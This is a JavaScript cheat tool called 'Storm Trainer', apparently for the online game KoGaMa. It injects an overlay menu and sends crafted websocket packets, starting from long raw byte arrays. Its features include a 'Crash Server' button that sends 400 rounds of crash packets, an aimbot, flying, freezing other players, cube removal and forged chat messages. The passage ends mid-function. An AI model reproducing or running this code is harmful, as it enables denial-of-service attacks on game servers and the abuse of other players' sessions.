255,250,0,1,0,1,7,2,255,250,0,1,0,2,7,2,255,250,0,1,0,3,7,2,255,250,0,1,0,4,7,2,255,250,0,1,0,5,7,2,255,250,0,1,0,6,7,2,255,250,0,1,0,7,7,2,255,250,0,1,0,8,7,2,255,250,0,2,0,8,7,2,255,247,255,255,0,3,7,2,255,250,0,2,0,6,7,2,255,250,0,2,0,4,7,2,255,244,255,253,0,0,19,2,255,250,0,2,0,2,7,2,255,247,0,2,0,8,7,2,255,247,0,2,0,6,7,2,255,247,0,2,0,4,7,2,255,244,0,0,0,1,7,2,255,244,0,1,0,2,7,2,255,247,255,255,0,0,7,2,255,244,255,255,0,0,7,2,255,247,0,3,0,4,19,2,255,247,0,3,0,5,19,2,255,247,0,3,0,6,19,2,255,247,0,3,0,7,19,2,255,244,0,1,0,1,7,2,255,249,0,3,0,8,11,2,255,242,0,0,0,0,11,2,255,242,0,1,0,0,15,2,255,242,0,2,0,0,7,2,255,238,0,0,255,254,79,2,255,239,0,0,255,255,75,2,255,247,255,254,0,1,7,2,255,247,255,254,0,2,7,2,255,246,0,0,0,1,23,2,255,244,0,3,0,1,31,2,255,244,0,3,0,2,31,2,255,244,0,3,0,3,31,2,0,0,6,30,63,128,0,0,0,4,15,111,0,0,2,196,0,0,0,88,255,242,0,0,255,253,63,15,255,245,0,0,0,0,51,15,255,244,0,0,0,0,7,7,255,242,0,3,0,0,63,15,255,248,0,0,0,3,15,15,255,248,0,0,0,10,11,15,255,248,0,0,0,11,11,15,255,242,0,1,255,253,63,15,255,242,0,2,255,253,7,15,0,0,0,2,0,0,7,15,0,0,0,2,255,253,7,15,255,244,0,1,0,3,19,15,255,244,255,254,0,3,19,15,255,242,0,3,255,255,63,15,255,250,0,1,0,0,31,15,255,244,255,253,0,1,19,15,255,244,0,2,0,0,7,15,255,242,0,3,255,253,63,15,255,242,0,3,255,254,63,15,255,250,0,2,0,0,7,15,255,252,0,2,0,0,7,15,255,254,0,2,0,0,7,15,255,244,255,254,0,2,7,15,255,244,255,253,0,2,19,15,255,244,0,2,255,253,7,15,255,244,255,253,0,3,19,15,255,246,0,2,255,253,7,15,255,248,0,2,255,253,7,15,255,250,0,2,255,253,7,15,255,252,0,2,255,253,7,15,255,244,255,254,0,1,7,15,255,254,0,2,255,253,7,15,255,249,0,0,0,12,7,15,255,247,0,0,0,3,7,7,255,247,0,0,0,4,19,15,255,247,0,0,0,5,19,15,255,247,0,0,0,6,19,15,255,247,0,0,0,7,19,15,255,247,0,0,0,8,19,15,255,247,0,0,0,9,19,15,255,244,0,0,0,3,15,15,255,247,0,1,0,9,7,15,255,244,255,254,0,0,19,15,255,250,0,1,0,9,7,15,255,244,0,0,0,2,31,15,255,247,0,1,0,4,7,15,255,247,0,1,0,5,7,15,255,247,0,1,0,6,7,15,255,247,0,1,0,7,7,15,255,247,0,1,0,8,7,15,255,250,0,1,0,1,7,15,255,250,0,1,0,2,7,15,255,250,0,1,0,3,7,15,255,250,0,1,0,4,7,15,255,250,0,1,0,5,7,15,255,250,0,1,0,6,7,15,255,250,0,1,0,7,7,15,255,250,0,1,0,8,7,15,255,250,0,2,0,8,7,15,255,247,255,255,0,3,7,15,255,250,0,2,0,6,7,15,255,250,0,2,0,4,7,15,255,244,255,253,0,0,19,15,255,250,0,2,0,2,7,15,255,247,0,2,0,8,7,15,255,247,0,2,0,6,7,15,255,247,0,2,0,4,7,15,255,244,0,0,0,1,7,15,255,244,0,1,0,2,7,15,255,247,255,255,0,0,7,15,255,244,255,255,0,0,7,15,255,247,0,3,0,4,19,15,255,247,0,3,0,5,19,15,255,247,0,3,0,6,19,15,255,247,0,3,0,7,19,15,255,244,0,1,0,1,7,15,255,249,0,3,0,8,11,15,255,242,0,0,0,0,11,15,255,242,0,1,0,0,15,15,255,242,0,2,0,0,7,15,255,238,0,0,255,254,79,15,255,239,0,0,255,255,75,15,255,247,255,254,0,1,7,15,255,247,255,254,0,2,7,15,255,246,0,0,0,1,23,15,255,244,0,3,0,1,31,15,255,244,0,3,0,2,31,15,255,244,0,3,0,3,31,15,0,0,6,40,63,128,0,0,0,4,15,111,0,0,1,4,0,0,0,32,0,0,0,0,0,0,7,7,0,0,0,1,0,0,7,7,0,0,0,2,0,0,7,7,0,0,0,3,0,0,7,7,0,0,0,0,255,255,7,7,0,0,0,1,255,255,7,7,0,0,0,0,255,254,7,7,0,0,0,2,255,255,7,7,0,0,0,3,255,255,7,7,0,0,0,1,255,254,7,7,0,0,0,2,255,254,7,7,0,0,0,3,255,254,7,7,0,0,0,0,255,253,7,7,0,0,0,1,255,253,7,7,0,0,0,2,255,253,7,7,0,0,0,3,255,253,7,7,255,254,0,0,0,0,11,21,255,254,0,3,0,0,11,21,255,254,0,3,255,253,11,21,255,254,0,0,255,253,11,21,255,254,0,1,255,253,11,21,255,254,0,2,255,253,11,21,255,254,0,0,255,255,11,21,255,254,0,0,255,254,11,21,255,254,0,1,0,0,11,21,255,254,0,2,0,0,11,21,255,254,0,1,255,255,11,21,255,254,0,1,255,254,11,21,255,254,0,2,255,255,11,21,255,254,0,2,255,254,11,21,255,254,0,3,255,255,11,21,255,254,0,3,255,254,11,21,0,0,6,41,63,128,0,0,0,4,15,111,0,0,1,132,0,0,0,48,0,0,0,0,255,252,7,10,255,255,0,0,255,252,7,21,255,255,0,2,255,252,7,21,255,254,0,1,255,252,7,10,0,0,0,0,255,255,7,10,0,0,0,1,255,255,7,10,0,0,0,0,255,254,7,10,0,0,0,2,255,255,7,10,0,0,0,3,255,255,7,10,0,0,0,1,255,254,7,10,0,0,0,2,255,254,7,10,0,0,0,3,255,254,7,10,0,0,0,0,255,253,7,10,0,0,0,1,255,253,7,10,0,0,0,2,255,253,7,10,0,0,0,3,255,253,7,10,0,0,0,1,255,252,7,10,255,255,0,3,255,252,7,21,255,255,0,2,255,255,7,21,255,254,0,2,255,252,7,10,255,255,0,3,255,255,7,21,255,255,0,1,255,252,7,21,255,255,0,0,255,255,7,21,255,255,0,1,255,255,7,21,255,255,0,0,255,254,7,21,255,255,0,0,255,253,7,21,255,255,0,1,255,254,7,21,255,255,0,2,255,254,7,21,255,255,0,3,255,254,7,21,255,255,0,3,255,253,7,21,255,255,0,1,255,253,7,21,255,255,0,2,255,253,7,21,0,0,0,2,255,252,7,10,255,254,0,3,255,252,7,10,255,254,0,3,255,253,7,10,255,254,0,0,255,253,7,10,255,254,0,1,255,253,7,10,255,254,0,2,255,253,7,10,255,254,0,0,255,255,7,10,255,254,0,0,255,254,7,10,0,0,0,3,255,252,7,10,255,254,0,0,255,252,7,10,255,254,0,1,255,255,7,10,255,254,0,1,255,254,7,10,255,254,0,2,255,255,7,10,255,254,0,2,255,254,7,10,255,254,0,3,255,255,7,10,255,254,0,3,255,254,7,10,0,0,6,43,63,128,0,0,0,4,15,111,0,0,1,4,0,0,0,32,0,0,0,0,255,252,7,2,255,254,0,3,255,253,11,21,0,0,0,0,255,255,7,2,0,0,0,1,255,255,7,2,0,0,0,0,255,254,7,2,0,0,0,2,255,255,7,2,0,0,0,3,255,255,7,2,0,0,0,1,255,254,7,2,0,0,0,2,255,254,7,2,0,0,0,3,255,254,7,2,0,0,0,0,255,253,7,2,0,0,0,1,255,253,7,2,0,0,0,2,255,253,7,2,0,0,0,3,255,253,7,2,0,0,0,1,255,252,7,2,255,254,0,1,255,252,11,21,0,0,0,2,255,252,7,2,255,254,0,2,255,253,11,21,255,254,0,2,255,254,11,21,255,254,0,0,255,253,11,21,255,254,0,3,255,254,11,21,255,254,0,1,255,254,11,21,255,254,0,0,255,255,11,21,255,254,0,0,255,254,11,21,0,0,0,3,255,252,7,2,255,254,0,0,255,252,11,21,255,254,0,2,255,255,11,21,255,254,0,3,255,255,11,21,255,254,0,1,255,255,11,21,255,254,0,3,255,252,11,21,255,254,0,2,255,252,11,21,255,254,0,1,255,253,11,21,0,0,6,44,63,128,0,0,0,4,15,111,0,0,1,4,0,0,0,32,0,0,0,0,255,252,7,15,255,254,0,3,255,253,11,21,0,0,0,0,255,255,7,15,0,0,0,1,255,255,7,15,0,0,0,0,255,254,7,15,0,0,0,2,255,255,7,15,0,0,0,3,255,255,7,15,0,0,0,1,255,254,7,15,0,0,0,2,255,254,7,15,0,0,0,3,255,254,7,15,0,0,0,0,255,253,7,15,0,0,0,1,255,253,7,15,0,0,0,2,255,253,7,15,0,0,0,3,255,253,7,15,0,0,0,1,255,252,7,15,255,254,0,1,255,252,11,21,0,0,0,2,255,252,7,15,255,254,0,2,255,253,11,21,255,254,0,2,255,254,11,21,255,254,0,0,255,253,11,21,255,254,0,3,255,254,11,21,255,254,0,1,255,254,11,21,255,254,0,0,255,255,11,21,255,254,0,0,255,254,11,21,0,0,0,3,255,252,7,15,255,254,0,0,255,252,11,21,255,254,0,2,255,255,11,21,255,254,0,3,255,255,11,21,255,254,0,1,255,255,11,21,255,254,0,3,255,252,11,21,255,254,0,2,255,252,11,21,255,254,0,1,255,253,11,21,0,0,6,45,62,128,0,0,0,4,15,111,0,0,3,84,0,0,0,53,255,255,0,7,255,252,6,46,120,124,24,19,119,115,41,23,255,255,0,7,0,4,6,20,120,124,48,43,119,115,15,23,255,255,0,10,0,2,6,105,105,109,59,54,104,100,100,21,255,255,0,7,255,253,6,20,120,124,48,43,119,115,15,23,255,255,0,10,255,254,6,55,105,109,109,104,104,100,50,21,255,255,0,10,255,253,6,55,105,109,59,54,104,100,50,21,0,0,0,9,0,3,6,20,96,124,24,4,104,76,0,15,0,0,0,9,255,252,6,20,96,124,24,4,104,76,0,15,0,0,0,9,255,253,6,20,120,98,24,4,78,100,0,15,0,0,0,9,0,4,6,20,120,98,24,4,78,100,0,15,0,0,0,10,0,4,6,5,55,57,8,3,52,50,0,21,0,0,0,10,0,3,6,10,35,39,14,4,54,50,0,15,255,255,0,8,0,4,6,20,120,124,48,28,104,100,0,15,0,0,0,10,0,2,6,5,55,59,9,4,54,50,0,21,255,255,0,9,0,3,6,46,120,124,49,29,104,100,26,15,255,255,0,9,0,4,6,45,120,124,49,29,104,100,25,15,0,0,0,8,0,3,6,20,96,124,24,4,104,76,0,15,255,255,0,7,0,3,6,46,120,124,24,19,119,115,41,23,255,255,0,9,255,251,6,30,55,69,44,29,54,50,25,16,255,255,0,8,255,253,6,20,120,124,48,28,104,100,0,15,255,255,0,8,0,3,6,46,120,124,24,4,104,100,26,15,255,255,0,8,255,252,6,46,120,124,24,4,104,100,26,15,255,255,0,9,255,253,6,45,120,124,48,28,104,100,25,15,255,255,0,9,255,252,6,45,120,124,49,29,104,100,25,15,0,0,0,7,255,253,6,20,70,48,23,3,28,50,0,23,0,0,0,8,255,253,6,20,120,98,24,4,78,100,0,15,0,0,0,7,255,252,6,21,46,74,24,4,54,26,1,23,0,0,0,8,255,252,6,20,96,124,24,4,104,76,0,15,0,0,0,7,0,3,6,21,46,74,24,9,59,31,6,23,0,0,0,7,0,4,6,20,70,48,23,8,33,55,5,23,255,255,0,9,0,5,6,40,65,59,34,29,54,50,25,16,0,0,0,8,0,4,6,20,120,98,24,4,78,100,0,15,255,255,0,9,0,1,6,70,120,124,74,69,114,110,65,23,0,0,0,9,0,0,6,20,70,74,24,4,79,75,0,23,0,0,0,9,0,1,6,20,115,117,22,2,102,100,0,22,0,0,0,9,255,255,6,22,117,119,24,4,104,102,2,22,0,0,0,8,255,255,6,23,73,74,24,4,54,53,3,23,0,0,0,8,0,0,6,20,70,74,24,4,54,50,0,23,0,0,0,8,0,1,6,20,70,71,21,1,51,50,0,23,255,255,0,10,0,3,6,55,105,109,59,54,104,100,50,21,255,255,0,10,0,4,6,55,105,108,57,52,103,100,50,21,0,0,0,10,0,1,6,45,70,59,34,29,54,60,35,21,0,0,0,10,0,0,6,40,65,69,44,29,54,50,25,23,0,0,0,10,255,255,6,30,55,74,49,39,64,50,25,21,0,0,0,10,255,254,6,5,55,59,9,4,54,50,0,21,0,0,0,10,255,253,6,10,35,39,14,4,54,50,0,15,255,255,0,10,255,252,6,57,106,109,59,54,104,101,52,21,0,0,0,10,255,252,6,6,57,59,9,4,54,52,1,21,255,255,0,9,255,255,6,70,120,124,74,69,114,110,65,23,0,1,0,9,0,1,6,15,40,42,17,2,27,25,0,21,0,1,0,9,255,255,6,17,42,44,19,4,29,27,2,21,0,1,0,8,255,255,6,22,47,49,24,4,29,27,2,21,0,1,0,8,0,1,6,20,45,47,22,2,27,25,0,21,0,0,6,46,62,128,0,0,0,4,15,111,0,0,3,84,0,0,0,53,255,255,0,7,255,252,6,46,120,124,24,19,119,115,41,23,255,255,0,7,0,4,6,20,120,124,48,43,119,115,15,23,255,255,0,10,0,2,6,105,105,109,59,54,104,100,100,21,255,255,0,7,255,253,6,20,120,124,48,43,119,115,15,23,255,255,0,10,255,254,6,55,105,109,109,104,104,100,50,21,255,255,0,10,255,253,6,55,105,109,59,54,104,100,50,21,0,0,0,9,0,3,6,20,96,124,24,4,104,76,0,7,0,0,0,9,255,252,6,20,96,124,24,4,104,76,0,7,0,0,0,9,255,253,6,20,120,98,24,4,78,100,0,7,0,0,0,9,0,4,6,20,120,98,24,4,78,100,0,7,0,0,0,10,0,4,6,5,55,57,8,3,52,50,0,21,0,0,0,10,0,3,6,10,35,39,14,4,54,50,0,15,255,255,0,8,0,4,6,20,120,124,48,28,104,100,0,7,0,0,0,10,0,2,6,5,55,59,9,4,54,50,0,21,255,255,0,9,0,3,6,46,120,124,49,29,104,100,26,7,255,255,0,9,0,4,6,45,120,124,49,29,104,100,25,7,0,0,0,8,0,3,6,20,96,124,24,4,104,76,0,7,255,255,0,7,0,3,6,46,120,124,24,19,119,115,41,23,255,255,0,9,255,251,6,30,55,69,44,29,54,50,25,5,255,255,0,8,255,253,6,20,120,124,48,28,104,100,0,7,255,255,0,8,0,3,6,46,120,124,24,4,104,100,26,7,255,255,0,8,255,252,6,46,120,124,24,4,104,100,26,7,255,255,0,9,255,253,6,45,120,124,48,28,104,100,25,7,255,255,0,9,255,252,6,45,120,124,49,29,104,100,25,7,0,0,0,7,255,253,6,20,70,48,23,3,28,50,0,23,0,0,0,8,255,253,6,20,120,98,24,4,78,100,0,7,0,0,0,7,255,252,6,21,46,74,24,4,54,26,1,23,0,0,0,8,255,252,6,20,96,124,24,4,104,76,0,7,0,0,0,7,0,3,6,21,46,74,24,9,59,31,6,23,0,0,0,7,0,4,6,20,70,48,23,8,33,55,5,23,255,255,0,9,0,5,6,40,65,59,34,29,54,50,25,5,0,0,0,8,0,4,6,20,120,98,24,4,78,100,0,7,255,255,0,9,0,1,6,70,120,124,74,69,114,110,65,23,0,0,0,9,0,0,6,20,70,74,24,4,79,75,0,23,0,0,0,9,0,1,6,20,115,117,22,2,102,100,0,22,0,0,0,9,255,255,6,22,117,119,24,4,104,102,2,22,0,0,0,8,255,255,6,23,73,74,24,4,54,53,3,23,0,0,0,8,0,0,6,20,70,74,24,4,54,50,0,23,0,0,0,8,0,1,6,20,70,71,21,1,51,50,0,23,255,255,0,10,0,3,6,55,105,109,59,54,104,100,50,21,255,255,0,10,0,4,6,55,105,108,57,52,103,100,50,21,0,0,0,10,0,1,6,45,100,111,1,133,98,0)
        },







CUBEGUN: function(x){
			CheatAPI.SEND_SOCKET(
				243,4,29,0,3,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),70,68,0,0,0,1,115,0,11,99,117,114,114,101,110,116,73,116,101,109,68,0,0,0,4,115,0,4,116,121,112,101,105,0,0,0,11,115,0,9,118,97,114,105,97,110,116,73,100,105,0,0,0,0,115,0,15,117,112,100,97,116,101,73,116,101,109,83,116,97,116,101,105,0,0,0,4,115,0,8,105,116,101,109,68,97,116,97,68,0,0,0,1,115,0,8,109,97,116,101,114,105,97,108,98,x,254,105,0,0,0,0)},

        SEND_CHAT_MESSAGE: function(MESSAGETYPE, ACTORNR, MESSAGE){
            let encodedMessage = CheatAPI.FUNCTIONS.ENCODE_TEXT(MESSAGE)
            CheatAPI.SEND_SOCKET(243, 2, 88, 0, 2, 87, 105, 0, 0, 0, MESSAGETYPE, 88, 68, 0, 0, 0, 2, 98, 0, 105, ...CheatAPI.FUNCTIONS.TO_BYTE_32(ACTORNR), 98, 5, 115, 0, encodedMessage.length, ...encodedMessage)
        }
    }
}

let menu = document.createElement("div")
menu.className = "CheatMenu"
top.document.body.appendChild(menu)

let head = document.createElement("div")
head.className = "CheatHead"
menu.appendChild(head)

let minimize = document.createElement("input")
minimize.className = "CheatMinimize"
minimize.type = "button"
minimize.value = "X"
minimize.onclick = function(){
    menu.style.display = "none"
    let open = document.createElement("div")
    open.className = "CheatOpen"
    open.onclick = function(){
        open.remove()
        menu.style.display = "block"
    }
    top.document.body.appendChild(open)
}
head.appendChild(minimize)


top.document.addEventListener("auxclick", function() {
    menu.style.display = "block"
})

let title = document.createElement("p")
title.className = "CheatTitle"
title.textContent = "Storm Trainer"
head.appendChild(title)

top.document.addEventListener('mouseup', e => {
    if (menu.movement) {
        menu.movement = false;
        e.preventDefault();
        e.stopPropagation();
    }
})
top.document.addEventListener('mousemove', e => {
    if (menu.movement) {
        menu.style.left = (menu.startpos.x + e.x - menu.startpos.mx) + 'px';
        menu.style.top = (menu.startpos.y + e.y - menu.startpos.my) + 'px';
        if (menu.offsetTop < 0) menu.style.top = '0px';
        e.preventDefault();
        e.stopPropagation();
    }
});
head.addEventListener('mousedown', e => {
    menu.movement = true;
    menu.startpos = {
        x: menu.offsetLeft,
        y: menu.offsetTop,
        mx: e.x,
        my: e.y
    };
    e.preventDefault();
    e.stopPropagation();
});

let tabs = document.createElement("div")
tabs.className = "CheatTabs"
menu.appendChild(tabs)

let reset1 = document.createElement("input")
reset1.className = "CheatButton"
reset1.style = `
position: absolute;
top: 90%;
left: 20%;
transform: translate(-50%, -50%);
`;
reset1.type = "button"
reset1.value = "Crash Server"
reset1.onclick = function(){
    CheatAPI.CHEATS.CLONE_OBJECTTEST(75579,"BOTH")
    for(var lag = 0; lag < 400; lag++){
     CheatAPI.CHEATS.CRASH_NOTI(5)
    CheatAPI.CHEATS.CRASH_NOTI(17)
    }
}
menu.appendChild(reset1)

let reset = document.createElement("input")
reset.className = "CheatButton"
reset.style = `
position: absolute;
top: 90%;
left: 50%;
transform: translate(-50%, -50%);
`;
reset.type = "button"
reset.value = "Reset"
reset.onclick = function(){
    if(window.kogamaload){
    Object.values(interface.tabsContent).forEach((tabContent)=>{
        tabContent.childNodes.forEach((node)=>{
            if(node.defaultState){
                node.defaultState()
            }
        })
    })
    }
}
menu.appendChild(reset)

let credits = document.createElement("h1")
credits.className = "CheatCredits"
credits.textContent = ""
menu.appendChild(credits)

let interface = {
    config: {
        color: "#f0fff",
        bodyColor: "#f0fff"
    },
    tabs: {},
    tabsContent: {},
    addTab: function(txt){
        let tab = document.createElement("input")
        tab.className = "CheatTab"
        tab.type = "button"
        tab.value = txt
        tabs.appendChild(tab)
        let content = document.createElement("div")
        content.className = "CheatTabContent"
        menu.appendChild(content)
        if(Object.values(interface.tabs).length == 0){
            tab.style.borderBottom = `2px solid ${interface.config.color}`
        }
        tab.onclick = function(){
            tab.style.borderBottom = `2px solid ${interface.config.color}`
            interface.tabsContent[txt].style.display = "block"
            Object.values(interface.tabs).forEach((Tab)=>{
                if(Tab != tab){
                    Tab.style.borderBottom = "2px solid #959596"
                }
            })
            Object.values(interface.tabsContent).forEach((Content)=>{
                if(Content != content){
                Content.style.display = "none"
                }
            })
        }
        interface.tabs[txt] = tab
        interface.tabsContent[txt] = content
    },
    addLine: function(visible, margin, tab) {
            let line = document.createElement("hr")
            if (!visible) {
                line.style.border = "none"
            }else{
                line.style.border = `1px solid ${interface.config.color}`
            }
            line.style.marginTop = `${margin/2}px`
            line.style.marginBottom = `${margin/2}px`
            interface.tabsContent[tab].appendChild(line)
        },
        addText: function(txt, tab) {
            interface.addLine(false, 30, tab)
            let text = document.createElement("p")
            text.className = "CheatText"
            text.textContent = `??${txt}`
            window[txt] = text
            interface.tabsContent[tab].appendChild(text)
        },
        addCheckBox: function(txt, tab) {
            interface.addLine(false, 30, tab)
            let input = document.createElement("input")
            input.type = "checkbox"
            input.id = "CheatCheckBox"
            input.defaultState = function(){
                input.checked = false
            }
            let label = document.createElement("label")
            label.for = "CheatCheckBox"
            label.textContent = `${txt}?`
            label.className = "CheatLabel"
            input.onmouseover = function() {
                this.style.opacity = "1"
                label.style.opacity = "1"
            }
            input.onmouseout = function() {
                this.style.opacity = "0.7"
                label.style.opacity = "0.7"
            }
            label.onmouseover = function() {
                this.style.opacity = "1"
                input.style.opacity = "1"
            }
            label.onmouseout = function() {
                this.style.opacity = "0.7"
                input.style.opacity = "0.7"
            }
            interface.tabsContent[tab].appendChild(label)
            interface.tabsContent[tab].appendChild(input)
            window[txt] = input
        },
        addButton: function(txt, tab) {
            interface.addLine(false, 30, tab)
            let input = document.createElement("input")
            input.className = "CheatButton"
            input.type = "button"
            input.value = txt
            if(txt.length > 16){
                input.style.width = `${txt.length*txt.length/2}px`
            }
            interface.tabsContent[tab].appendChild(input)
            window[txt] = input
        },
        addRange: function(txt, tab) {
            interface.addLine(false, 30, tab)
            let div = document.createElement("div")
            div.className = "CheatRangeDiv"
            interface.tabsContent[tab].appendChild(div)
            let input = document.createElement("input")
            input.type = "range"
            input.id = "CheatRange"
            let label = document.createElement("label")
            label.for = "CheatRange"
            label.textContent = txt
            label.className = "CheatLabel"
            input.onmouseover = function() {
                label.style.opacity = "1"
            }
            input.onmouseout = function() {
                label.style.opacity = "0.7"
            }
            div.appendChild(label)
            div.appendChild(input)
            div.defaultState = function(){
                input.value = input.min
                input.onchange()
                label.textContent = txt
            }
            window[txt] = {
                input: input,
                label: label
            }
        },
        addSelect(txt, options, tab, confirm) {
            interface.addLine(false, 30, tab)
            let div = document.createElement("div")
            div.className = "CheatSelectDiv"
            let select = document.createElement("select")
            select.className = "CheatSelect"
            select.defaultState = function(){
                select.options[0].selected = true
            }
            select.updateOptions = function(options){
                select.options.length = 0
                let option = document.createElement("option")
                option.textContent = txt
                option.disabled = true
                option.selected = true
                select.appendChild(option)
                options.forEach((opt)=>{
                    let option = document.createElement("option")
                    option.textContent = opt
                    select.appendChild(option)
                })
            }
            let option = document.createElement("option")
            option.selected = true
            option.disabled = true
            option.textContent = txt
            select.appendChild(option)
            options.forEach((opt) => {
                let option = document.createElement("option")
                option.textContent = opt
                select.appendChild(option)
            })
            let input = document.createElement("input")
            input.className = "CheatButton"
            input.style = `
            height: 40px;
            width: 40px;
            margin-left: 10px;
            `
            input.type = "button"
            input.value = "?"
            input.onclick = confirm
            div.appendChild(select)
            div.appendChild(input)
            interface.tabsContent[tab].appendChild(div)
            window[txt] = select
        },
        addTextField: function(txt, tab){
            interface.addLine(false, 30, tab)
            let input = document.createElement("input")
            input.className = "CheatButton"
            input.type = "text"
            input.placeholder = txt
            input.defaultState = function(){
                input.value = ""
                input.disabled = true
            }
            interface.tabsContent[tab].appendChild(input)
            window[txt] = input
        },
    addFileInput: function(name, tab){
        interface.addLine(false, 30, tab)
        let input = document.createElement("input")
        input.type = "file"
        interface.tabsContent[tab].appendChild(input)
        window[name] = input
    },
}

let css = document.createElement("style")
css.textContent = `
@charset "UTF-8";
@import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300&display=swap');
.CheatWaitingText {
margin-top: 150px;
color: #ff0000;
user-select: none;
font-family: Comic Sans;
font-size: 50px;
}
.CheatOpen {
position: fixed;
z-index: 9999;
top: 0%;
left: 50%;
transform: translate(-50%, -50%);
background-color: #000000;
height: 60px;
width: 60px;
box-shadow: 0 0 20px black;
border-radius: 50%;
-webkit-transition: box-shadow 0.5s;
transition: box-shadow 0.5s;
}
.CheatOpen:hover {
box-shadow: 0 0 40px black;
}
.CheatMenu {
position: fixed;
z-index: 9999;
top: 100px;
left: 300px;
height: 400px;
width: 650px;
background-color: ${interface.config.bodyColor ? interface.config.bodyColor : "#1c1b1b"};
border-top: 5px solid ${interface.config.color};
opacity: 95%;
animation: borderAnim 8s infinite;
box-shadow: 0 0 20px black;
font-family: Comic Sans;
scrollbar-color: white #1c1b1b;
text-align: center;
justify-content: center;
}
::-webkit-scrollbar {
width: 10px;
-webkit-transition: all 0.5s;
transition: all 0.5s;
}
::-webkit-scrollbar-track {
border-radius: 10px;
}
::-webkit-scrollbar-thumb {
background: white;
border-radius: 10px;
}
::-webkit-scrollbar-thumb:hover {
background: grey;
}
.CheatHead {
position: fixed;
z-index: 9999;
width: 650px;
display: flex;
justify-content: right;
align-items: right;
}
.CheatMinimize {
background-color: transparent;
color: white;
border: none;
height: 30px;
width: 50px;
-webkit-transition: all 0.5s;
transition: all 0.5s;
}
.CheatMinimize:hover {
background-color: #ff0000;
color: black;
}
.CheatTitle {
position: absolute;
top: 80%;
left: 50%;
transform: translate(-50%, -50%);
color: #ff0000;
font-size: 30px;
user-select: none;
}
.CheatTabs {
display: none;
position: absolute;
top: 60px;
height: 30px;
width: 100%;
}
.CheatTab {
height: 30px;
width: 70px;
color: ${interface.config.color};
background-color: #1c1b1b;
border: none;
border-bottom: 2px solid #959596;
}
.CheatTabContent {
display: none;
position: absolute;
top: 55%;
left: 50%;
padding: 10px;
transform: translate(-50%, -50%);
text-align: left;
align-items: left;
justify-content: left;
height: 215px;
width: 600px;
overflow-y: auto;
border: 1px solid ${interface.config.color};
}
.CheatCredits {
user-select: none;
color: #959596;
position: absolute;
top: 90%;
left: 80%;
transform: translate(-50%, -50%);
font-size: 15px;
}
.CheatText {
color: ${interface.config.color};
font-size: 15px;
user-select: none;
}
.CheatMenu input[type="checkbox"]{
width: 13px !important;
height: 13px !important;
-webkit-appearance: none;
-moz-appearance: none;
-o-appearance: none;
appearance:none;
outline: 2px solid white;
box-shadow: none;
opacity: 0.7;
-webkit-transition: all 0.5s;
transition: all 0.5s;
}
.CheatMenu input[type="checkbox"]:checked {
background-color: ${interface.config.color};
box-sizing: border-box;
-moz-box-sizing: border-box;
-webkit-box-sizing: border-box;
border: 2px solid black;
}
.CheatLabel {
pointer-events: none;
z-index: 9999;
color: ${interface.config.color};
user-select: none;
opacity: 0.7;
-webkit-transition: all 0.5s;
transition: all 0.5s;
}
.CheatButton {
border: none;
background-color: #262626;
color: ${interface.config.color};
height: 40px;
width: 140px;
text-align: center;
box-sizing: border-box;
-moz-box-sizing: border-box;
-webkit-box-sizing: border-box;
border: 2px solid #454545;
outline: none;
opacity: 0.7;
-webkit-transition: all 0.5s;
transition: all 0.5s;
}
.CheatButton:hover {
opacity: 1;
}
.CheatRangeDiv {
width: 190px;
display: flex;
align-items: center;
justify-content: center;
}
#CheatRange {
-webkit-appearance: none;
position: absolute;
appearance: none;
background: #262626;
height: 25px;
outline: none;
opacity: 0.7;
-webkit-transition: all 0.5s;
transition: all 0.5s;
cursor: e-resize;
}
#CheatRange:hover {
opacity: 1;
}
#CheatRange::-webkit-slider-thumb {
-webkit-appearance: none;
appearance: none;
width: 10px;
height: 20px;
border: none;
background: ${interface.config.color};
}

#CheatRange::-moz-range-thumb {
background: ${interface.config.color};
width: 10px;
height: 20px;
border: none;
}
.CheatSelect {
background-color: #262626;
color: ${interface.config.color};
height: 40px;
box-sizing: border-box;
-moz-box-sizing: border-box;
-webkit-box-sizing: border-box;
border: 2px solid #454545;
opacity: 0.7;
-webkit-transition: all 0.5s;
transition: all 0.5s;
font-family: Comic Sans;
}
.CheatSelect:hover {
opacity: 1;
}
`
top.document.head.appendChild(css)

top.deleteSkin = function(){
    let posx = CheatAPI.PLAYER.POS.X
    let posy = CheatAPI.PLAYER.POS.Y
    let posz = CheatAPI.PLAYER.POS.Z
    for(var x = 0; x < 10; x++){
        for(var y = 0; y < 10; y++){
            for(var z = 0; z < 10; z++){
                CheatAPI.CHEATS.REMOVE_CUBE(posx+x, posy+y, posz+z, "BOTH")
            }
        }
    }
}
document.onkeydown = function(e) {
    if (e.key == " " && window.fly) {
        for (var i = 0; i < window.fly; i++) {
            CheatAPI.CHEATS.IMPULSE(CheatAPI.PLAYER.WOID)
        }
    } else if (e.key == "1" && window.freezeplayerskey) {
        window.freezeplayers = true
    } else if (e.key == "2" && window.freezeplayerskey) {
        window.freezeplayers = false


    } else if (e.key == "]") {
        window.socks ? window.socks = false : window.socks = true
    } else  if (aimBot == true){if (e.key == "3") {
 window.aimbot ? window.aimbot = false : window.aimbot = true
        setTimeout(()=>{
CheatAPI.SEND_SOCKET(243,2,25,0,2,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),70,68,0,0,0,1,115,0,8,105,115,70,105,114,105,110,103,111,0)
        }, 0)

     }
       if (e.key == "8") {
 window.aimbotest ? window.aimbotest = false : window.aimbotest = true
        setTimeout(()=>{
CheatAPI.SEND_SOCKET(243,2,25,0,2,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),70,68,0,0,0,1,115,0,8,105,115,70,105,114,105,110,103,111,0)
        }, 0)

     }} else  if (cubeBot == true){
         if (e.key == "4") {
                               window.cubebot = true}

       else if (e.key == "5") {
                              window.cubebot = false
           } else  if (cubeBot1 == true){
         if (e.key == "6") {
                               window.cubebot1 = true}

       else if (e.key == "7") {
                              window.cubebot1 = false
       } else if (e.key == "8") {
CheatAPI.SEND_SOCKET(243,2,93,0,1,245,68,0,0,0,1,115,0,1,86,111,0)

                                }}}}
interface.addTab("Player")
interface.addTab("Weapon")
interface.addTab("Chat")
interface.addTab("Cube")
interface.addTab("Crash")
interface.addTab("Notif")
interface.addTab("MAP")
interface.addTab("Objects")
interface.addTab("Other")

interface.addLine(true, 30, "Player")
interface.addCheckBox("Immortality", "Player")
window["Immortality"].onchange = function() {
    if (this.checked) {
